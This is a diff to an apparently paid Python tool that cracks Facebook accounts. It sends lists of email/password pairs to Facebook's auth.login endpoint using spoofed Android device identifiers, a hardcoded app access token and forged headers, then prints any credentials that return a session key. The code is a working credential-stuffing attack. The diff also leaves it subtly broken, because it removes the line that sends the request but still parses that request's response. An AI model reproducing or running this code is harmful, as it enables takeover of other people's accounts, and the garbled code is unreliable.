@@ -161,7 +161,7 @@ logo=("""\033[1;91m
 [~] Author   :  M HASHIM
 [~] Facebook:M HASHIM
 [~] Tool     : Paid
-[~] Version  : 30.0
+[~] Version  : 0.01
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -473,46 +473,8 @@ def api1(ids,names,passlist):
 				device_family_id = str(uuid.uuid4())
 				adid = str(uuid.uuid4())
 				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-				data = {'adid':adid,
-				'format':'json',
-				'device_id':device_family_id,
-				'email':ids,
-				'password':pas,
-				'generate_analytics_claim':'1',
-				'community_id':'','cpl':'true','try_num':'1',
-				'family_device_id':device_family_id,
-				'credentials_type':'device_based_login_password',
-				'generate_session_cookies':'1',
-				'error_detail_type':'button_with_disabled',
-				'source':'device_based_login',
-				'machine_id':machine_id,
-				'login_location_accuracy_m':'1.0',
-				'meta_inf_fbmeta':'',
-				'advertiser_id':adid,
-				'encrypted_msisdn':'',
-				'currently_logged_in_userid':'0',
-				'locale':'en_PK',
-				'client_country_code':'PK',
-				'method':'auth.login',
-				'fb_api_req_friendly_name':'authenticate',
-				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-				headers = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'referer': 'https://www.google.com/',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5665.221 Mobile Safari/537.36',}
-				url = 'https://b-api.facebook.com/method/auth.login'
-				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+				data ={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+				headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-Fb-Privacy-Context": "2368177546817046","X-Graphql-Client-Library": "graphservice","X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE","X-Graphql-Request-Purpose": "fetch","X-Fb-Background-State": "1","User-Agent": useragent,"X-FB-Net-HNI": "41001","X-FB-SIM-HNI": "41001","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9","x-fb-device-group": "4481","X-FB-Friendly-Name": "SuggestionsFriendListContentQuery","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "ef0e330bff1cd312f36aa5f2c69c59a9","Connection": "Keep-Alive"}
 				q = json.loads(po)
 				if 'session_key' in q:
 					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
